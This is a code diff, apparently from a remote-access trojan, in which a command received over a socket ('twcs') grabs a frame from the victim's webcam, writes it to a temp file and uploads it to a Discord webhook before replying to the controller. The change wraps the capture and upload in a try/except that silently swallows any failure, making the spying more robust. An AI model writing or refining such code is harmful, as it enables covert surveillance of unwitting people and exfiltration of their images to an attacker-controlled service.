@@ -205,23 +205,27 @@ while True:
         if incoming_message[0] == "twcs":
             end = str(['twcs', "Unknown error occured."])
             
-            shot = cv2.VideoCapture(int(incoming_message[1]))
-            result, image = shot.read()
+            try:
+                shot = cv2.VideoCapture(int(incoming_message[1]))
             
-            number = str(random.randint(0,10000))
-            directory = tempfile.gettempdir() + "/abc-" + number + ".jpg"
+                result, image = shot.read()
             
-            cv2.imwrite(directory, image)
+                number = str(random.randint(0,10000))
+                directory = tempfile.gettempdir() + "/abc-" + number + ".jpg"
             
-            webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
+                cv2.imwrite(directory, image)
             
-            with open(directory, "rb") as f:
-                webhook.add_file(file=f.read(), filename="shot.png")
+                webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
+            
+                with open(directory, "rb") as f:
+                    webhook.add_file(file=f.read(), filename="shot.png")
                 
-            response = webhook.execute()
+                response = webhook.execute()
             
-            if response:
-                end = str(['twcs', str(response)])
+                if response:
+                    end = str(['twcs', str(response)])
+            except:
+                pass
                 
             end = end.encode()
             s.send(end)
